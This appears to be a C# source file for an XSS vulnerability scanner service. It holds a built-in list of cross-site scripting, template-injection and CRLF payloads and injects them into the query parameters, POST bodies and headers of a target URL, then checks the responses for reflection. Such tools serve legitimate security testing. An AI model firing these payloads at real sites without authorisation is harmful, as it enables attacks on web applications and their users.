using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web;
using WebTrafficInspector.Models;

namespace WebTrafficInspector.Services
{
    public class XSSScannerService
    {
        private List<string> _xssPayloads = new List<string>();
        private HttpClient _httpClient;
        private List<XSSScanResult> _scanHistory = new List<XSSScanResult>();

        public XSSScannerService()
        {
            _httpClient = new HttpClient
            {
                Timeout = TimeSpan.FromSeconds(30)
            };
            LoadDefaultPayloads();
        }

        public void LoadPayloadsFromFile(string filePath)
        {
            if (!File.Exists(filePath))
                throw new FileNotFoundException($"Payload file not found: {filePath}");

            _xssPayloads.Clear();
            var lines = File.ReadAllLines(filePath);

            foreach (var line in lines)
            {
                var trimmed = line.Trim();
                if (!string.IsNullOrEmpty(trimmed) && !trimmed.StartsWith("#") && !trimmed.StartsWith("//"))
                {
                    _xssPayloads.Add(trimmed);
                }
            }
        }

        public void LoadDefaultPayloads()
        {
            _xssPayloads = new List<string>
            {
                // Basic XSS
                "<script>alert('XSS')</script>",
                "<script>alert(1)</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>",

                // Event handlers
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<input autofocus onfocus=alert(1)>",
                "<select autofocus onfocus=alert(1)>",
                "<textarea autofocus onfocus=alert(1)>",
                "<keygen autofocus onfocus=alert(1)>",
                "<video><source onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>",

                // JavaScript protocol
                "javascript:alert(1)",
                "javascript:alert('XSS')",

                // Data URI
                "data:text/html,<script>alert('XSS')</script>",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",

                // Filter bypass
                "<scr<script>ipt>alert(1)</scr</script>ipt>",
                "<img src=\"x\" onerror=\"alert(1)\">",
                "<<SCRIPT>alert('XSS');//<</SCRIPT>",
                "<SCript>alert('XSS')</sCRipt>",
                "<img src=x oneRRor=alert(1)>",

                // DOM XSS
                "#<img src=x onerror=alert(1)>",
                "'-alert(1)-'",
                "\";alert(1);//",
                "'-alert(1)-'",

                // Polyglot
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",

                // HTML injection
                "<h1>XSS Test</h1>",
                "<marquee>XSS</marquee>",
                "<plaintext>",

                // Advanced bypass
                "<svg><script>alert&#40;1&#41;</script>",
                "<svg><script>alert&#x28;1&#x29;</script>",
                "<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",

                // Encoded payloads
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",

                // Template injection
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",

                // AngularJS
                "{{constructor.constructor('alert(1)')()}}",
                "{{$on.constructor('alert(1)')()}}",

                // VueJS
                "{{_c.constructor('alert(1)')()}}",

                // React
                "javascript:alert(1)/*",

                // CRLF injection for XSS
                "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<script>alert(1)</script>"
            };
        }

        public async Task<XSSScanReport> ScanUrl(string url, XSSScanOptions options = null)
        {
            options = options ?? new XSSScanOptions();

            var report = new XSSScanReport
            {
                TargetUrl = url,
                StartTime = DateTime.Now,
                PayloadsUsed = _xssPayloads.Count,
                Results = new List<XSSVulnerability>()
            };

            try
            {
                // Parse URL and extract parameters
                var uri = new Uri(url);
                var parameters = ExtractParameters(url);

                if (!parameters.Any() && !options.TestHeaders && !options.TestCookies)
                {
                    report.Status = "No injection points found";
                    report.EndTime = DateTime.Now;
                    return report;
                }

                // Test each parameter with each payload
                foreach (var param in parameters)
                {
                    foreach (var payload in _xssPayloads)
                    {
                        report.TotalTests++;

                        var testUrl = InjectPayloadInParameter(url, param, payload, options.EncodePayload);
                        var vulnerability = await TestPayload(testUrl, payload, $"Parameter: {param}", options);

                        if (vulnerability != null)
                        {
                            report.Results.Add(vulnerability);
                            report.VulnerabilitiesFound++;

                            if (options.StopOnFirstVulnerability)
                                break;
                        }

                        // Respect delay between requests
                        if (options.DelayBetweenRequests > 0)
                            await Task.Delay(options.DelayBetweenRequests);
                    }

                    if (options.StopOnFirstVulnerability && report.VulnerabilitiesFound > 0)
                        break;
                }

                // Test headers if enabled
                if (options.TestHeaders)
                {
                    var headerVulns = await TestHeaders(url, options);
                    report.Results.AddRange(headerVulns);
                    report.VulnerabilitiesFound += headerVulns.Count;
                }

                // Test cookies if enabled
                if (options.TestCookies)
                {
                    var cookieVulns = await TestCookies(url, options);
                    report.Results.AddRange(cookieVulns);
                    report.VulnerabilitiesFound += cookieVulns.Count;
                }

                report.EndTime = DateTime.Now;
                report.Duration = (report.EndTime - report.StartTime).TotalSeconds;
                report.Status = report.VulnerabilitiesFound > 0 ? "VULNERABLE" : "Not Vulnerable";

                _scanHistory.Add(new XSSScanResult
                {
                    Url = url,
                    Timestamp = DateTime.Now,
                    VulnerabilitiesFound = report.VulnerabilitiesFound,
                    TotalTests = report.TotalTests
                });
            }
            catch (Exception ex)
            {
                report.Status = $"Error: {ex.Message}";
                report.EndTime = DateTime.Now;
            }

            return report;
        }

        public async Task<XSSScanReport> ScanTrafficEntry(TrafficEntry entry, XSSScanOptions options = null)
        {
            var url = entry.Url;
            var report = await ScanUrl(url, options);

            // Also test POST body if present
            if (entry.Method == "POST" && !string.IsNullOrEmpty(entry.RawRequest))
            {
                var bodyParams = ExtractPostBodyParameters(entry.RawRequest);
                foreach (var param in bodyParams)
                {
                    foreach (var payload in _xssPayloads)
                    {
                        report.TotalTests++;

                        var modifiedBody = InjectPayloadInBody(entry.RawRequest, param.Key, payload);
                        var vulnerability = await TestPostRequest(entry.Url, modifiedBody, payload, $"POST Body: {param.Key}", options);

                        if (vulnerability != null)
                        {
                            report.Results.Add(vulnerability);
                            report.VulnerabilitiesFound++;
                        }
                    }
                }
            }

            return report;
        }

        public async Task<BatchXSSScanReport> BatchScan(List<TrafficEntry> entries, XSSScanOptions options = null)
        {
            var batchReport = new BatchXSSScanReport
            {
                StartTime = DateTime.Now,
                TotalUrls = entries.Count,
                Reports = new List<XSSScanReport>()
            };

            foreach (var entry in entries)
            {
                var report = await ScanTrafficEntry(entry, options);
                batchReport.Reports.Add(report);
                batchReport.TotalVulnerabilities += report.VulnerabilitiesFound;
                batchReport.TotalTests += report.TotalTests;

                if (report.VulnerabilitiesFound > 0)
                    batchReport.VulnerableUrls++;
            }

            batchReport.EndTime = DateTime.Now;
            batchReport.Duration = (batchReport.EndTime - batchReport.StartTime).TotalSeconds;

            return batchReport;
        }

        private async Task<XSSVulnerability> TestPayload(string url, string payload, string location, XSSScanOptions options)
        {
            try
            {
                var response = await _httpClient.GetAsync(url);
                var content = await response.Content.ReadAsStringAsync();

                // Check if payload is reflected in response
                var isReflected = IsPayloadReflected(content, payload);
                var isExecutable = IsPayloadExecutable(content, payload);

                if (isReflected || isExecutable)
                {
                    return new XSSVulnerability
                    {
                        Url = url,
                        Payload = payload,
                        InjectionPoint = location,
                        IsReflected = isReflected,
                        IsExecutable = isExecutable,
                        Severity = DetermineSeverity(isExecutable),
                        Evidence = ExtractEvidence(content, payload),
                        StatusCode = (int)response.StatusCode,
                        Timestamp = DateTime.Now
                    };
                }
            }
            catch
            {
                // Ignore request errors
            }

            return null;
        }

        private async Task<XSSVulnerability> TestPostRequest(string url, string body, string payload, string location, XSSScanOptions options)
        {
            try
            {
                var content = new StringContent(body, Encoding.UTF8, "application/x-www-form-urlencoded");
                var response = await _httpClient.PostAsync(url, content);
                var responseContent = await response.Content.ReadAsStringAsync();

                var isReflected = IsPayloadReflected(responseContent, payload);
                var isExecutable = IsPayloadExecutable(responseContent, payload);

                if (isReflected || isExecutable)
                {
                    return new XSSVulnerability
                    {
                        Url = url,
                        Payload = payload,
                        InjectionPoint = location,
                        IsReflected = isReflected,
                        IsExecutable = isExecutable,
                        Severity = DetermineSeverity(isExecutable),
                        Evidence = ExtractEvidence(responseContent, payload),
                        StatusCode = (int)response.StatusCode,
                        Timestamp = DateTime.Now
                    };
                }
            }
            catch
            {
                // Ignore request errors
            }

            return null;
        }

        private async Task<List<XSSVulnerability>> TestHeaders(string url, XSSScanOptions options)
        {
            var vulnerabilities = new List<XSSVulnerability>();
            var testHeaders = new[] { "User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP", "Cookie" };

            foreach (var header in testHeaders)
            {
                foreach (var payload in _xssPayloads.Take(10)) // Test with subset of payloads
                {
                    try
                    {
                        var request = new HttpRequestMessage(HttpMethod.Get, url);
                        request.Headers.TryAddWithoutValidation(header, payload);

                        var response = await _httpClient.SendAsync(request);
                        var content = await response.Content.ReadAsStringAsync();

                        if (IsPayloadReflected(content, payload))
                        {
                            vulnerabilities.Add(new XSSVulnerability
                            {
                                Url = url,
                                Payload = payload,
                                InjectionPoint = $"Header: {header}",
                                IsReflected = true,
                                IsExecutable = IsPayloadExecutable(content, payload),
                                Severity = "Medium",
                                Evidence = ExtractEvidence(content, payload),
                                StatusCode = (int)response.StatusCode,
                                Timestamp = DateTime.Now
                            });
                        }
                    }
                    catch { }
                }
            }

            return vulnerabilities;
        }

        private async Task<List<XSSVulnerability>> TestCookies(string url, XSSScanOptions options)
        {
            var vulnerabilities = new List<XSSVulnerability>();
            // Cookie testing implementation
            return vulnerabilities;
        }

        private bool IsPayloadReflected(string response, string payload)
        {
            // Check for exact match
            if (response.Contains(payload))
                return true;

            // Check for URL encoded version
            var encoded = HttpUtility.UrlEncode(payload);
            if (response.Contains(encoded))
                return true;

            // Check for HTML encoded version
            var htmlEncoded = HttpUtility.HtmlEncode(payload);
            if (response.Contains(htmlEncoded))
                return true;

            // Check for partial matches (for filtered payloads)
            var significantParts = ExtractSignificantParts(payload);
            return significantParts.Any(part => response.Contains(part));
        }

        private bool IsPayloadExecutable(string response, string payload)
        {
            // Check if payload is in executable context
            if (payload.Contains("<script>") && response.Contains("<script>"))
                return true;

            if (payload.Contains("onerror=") && Regex.IsMatch(response, @"onerror\s*=\s*[^&<>\s]"))
                return true;

            if (payload.Contains("onload=") && Regex.IsMatch(response, @"onload\s*=\s*[^&<>\s]"))
                return true;

            if (payload.StartsWith("javascript:") && response.Contains("javascript:"))
                return true;

            return false;
        }

        private string DetermineSeverity(bool isExecutable)
        {
            return isExecutable ? "High" : "Medium";
        }

        private string ExtractEvidence(string response, string payload)
        {
            var index = response.IndexOf(payload);
            if (index == -1)
                return "";

            var start = Math.Max(0, index - 50);
            var length = Math.Min(response.Length - start, payload.Length + 100);
            return response.Substring(start, length);
        }

        private List<string> ExtractSignificantParts(string payload)
        {
            var parts = new List<string>();

            // Extract tag names
            var tagMatches = Regex.Matches(payload, @"<(\w+)");
            foreach (Match match in tagMatches)
            {
                parts.Add(match.Value);
            }

            // Extract event handlers
            var eventMatches = Regex.Matches(payload, @"on\w+\s*=");
            foreach (Match match in eventMatches)
            {
                parts.Add(match.Value);
            }

            return parts;
        }

        private List<string> ExtractParameters(string url)
        {
            var parameters = new List<string>();
            var uri = new Uri(url);

            if (!string.IsNullOrEmpty(uri.Query))
            {
                var query = uri.Query.TrimStart('?');
                var parts = query.Split('&');

                foreach (var part in parts)
                {
                    var keyValue = part.Split('=');
                    if (keyValue.Length > 0)
                    {
                        parameters.Add(keyValue[0]);
                    }
                }
            }

            return parameters;
        }

        private Dictionary<string, string> ExtractPostBodyParameters(string rawRequest)
        {
            var parameters = new Dictionary<string, string>();
            var bodyStart = rawRequest.IndexOf("\r\n\r\n");
            if (bodyStart == -1) return parameters;

            var body = rawRequest.Substring(bodyStart + 4);
            var parts = body.Split('&');

            foreach (var part in parts)
            {
                var keyValue = part.Split('=');
                if (keyValue.Length >= 1)
                {
                    parameters[keyValue[0]] = keyValue.Length > 1 ? keyValue[1] : "";
                }
            }

            return parameters;
        }

        private string InjectPayloadInParameter(string url, string parameter, string payload, bool encode)
        {
            var uri = new Uri(url);
            var queryParams = HttpUtility.ParseQueryString(uri.Query);

            var encodedPayload = encode ? HttpUtility.UrlEncode(payload) : payload;
            queryParams[parameter] = encodedPayload;

            var builder = new UriBuilder(uri)
            {
                Query = queryParams.ToString()
            };

            return builder.ToString();
        }

        private string InjectPayloadInBody(string rawRequest, string parameter, string payload)
        {
            var bodyStart = rawRequest.IndexOf("\r\n\r\n");
            if (bodyStart == -1) return rawRequest;

            var headers = rawRequest.Substring(0, bodyStart);
            var body = rawRequest.Substring(bodyStart + 4);

            var parts = body.Split('&').ToList();
            for (int i = 0; i < parts.Count; i++)
            {
                var keyValue = parts[i].Split('=');
                if (keyValue.Length > 0 && keyValue[0] == parameter)
                {
                    parts[i] = $"{parameter}={HttpUtility.UrlEncode(payload)}";
                }
            }

            return headers + "\r\n\r\n" + string.Join("&", parts);
        }

        public string GenerateReport(XSSScanReport report)
        {
            var sb = new StringBuilder();
            sb.AppendLine("═══════════════════════════════════════════════════");
            sb.AppendLine("           XSS VULNERABILITY SCAN REPORT");
            sb.AppendLine("═══════════════════════════════════════════════════");
            sb.AppendLine($"Target URL: {report.TargetUrl}");
            sb.AppendLine($"Scan Time: {report.StartTime}");
            sb.AppendLine($"Duration: {report.Duration:F2} seconds");
            sb.AppendLine($"Status: {report.Status}");
            sb.AppendLine();
            sb.AppendLine($"Total Tests: {report.TotalTests}");
            sb.AppendLine($"Payloads Used: {report.PayloadsUsed}");
            sb.AppendLine($"Vulnerabilities Found: {report.VulnerabilitiesFound}");
            sb.AppendLine();

            if (report.Results.Any())
            {
                sb.AppendLine("VULNERABILITIES DETECTED:");
                sb.AppendLine("═════════════════════════════════════════════════");

                foreach (var vuln in report.Results)
                {
                    sb.AppendLine();
                    sb.AppendLine($"[{vuln.Severity}] {vuln.InjectionPoint}");
                    sb.AppendLine($"  Payload: {vuln.Payload}");
                    sb.AppendLine($"  Reflected: {vuln.IsReflected}");
                    sb.AppendLine($"  Executable: {vuln.IsExecutable}");
                    sb.AppendLine($"  Status Code: {vuln.StatusCode}");
                    if (!string.IsNullOrEmpty(vuln.Evidence))
                    {
                        sb.AppendLine($"  Evidence: {vuln.Evidence.Substring(0, Math.Min(100, vuln.Evidence.Length))}...");
                    }
                }
            }
            else
            {
                sb.AppendLine("No vulnerabilities detected.");
            }

            sb.AppendLine();
            sb.AppendLine("═══════════════════════════════════════════════════");

            return sb.ToString();
        }

        public int GetPayloadCount() => _xssPayloads.Count;
        public List<XSSScanResult> GetScanHistory() => _scanHistory;
    }

    public class XSSScanOptions
    {
        public bool EncodePayload { get; set; } = false;
        public bool TestHeaders { get; set; } = true;
        public bool TestCookies { get; set; } = false;
        public bool StopOnFirstVulnerability { get; set; } = false;
        public int DelayBetweenRequests { get; set; } = 100; // milliseconds
        public int MaxPayloadsPerParameter { get; set; } = 0; // 0 = all
    }

    public class XSSScanReport
    {
        public string TargetUrl { get; set; }
        public DateTime StartTime { get; set; }
        public DateTime EndTime { get; set; }
        public double Duration { get; set; }
        public string Status { get; set; }
        public int TotalTests { get; set; }
        public int PayloadsUsed { get; set; }
        public int VulnerabilitiesFound { get; set; }
        public List<XSSVulnerability> Results { get; set; }
    }

    public class XSSVulnerability
    {
        public string Url { get; set; }
        public string Payload { get; set; }
        public string InjectionPoint { get; set; }
        public bool IsReflected { get; set; }
        public bool IsExecutable { get; set; }
        public string Severity { get; set; }
        public string Evidence { get; set; }
        public int StatusCode { get; set; }
        public DateTime Timestamp { get; set; }
    }

    public class BatchXSSScanReport
    {
        public DateTime StartTime { get; set; }
        public DateTime EndTime { get; set; }
        public double Duration { get; set; }
        public int TotalUrls { get; set; }
        public int VulnerableUrls { get; set; }
        public int TotalTests { get; set; }
        public int TotalVulnerabilities { get; set; }
        public List<XSSScanReport> Reports { get; set; }
    }

    public class XSSScanResult
    {
        public string Url { get; set; }
        public DateTime Timestamp { get; set; }
        public int VulnerabilitiesFound { get; set; }
        public int TotalTests { get; set; }
    }
}
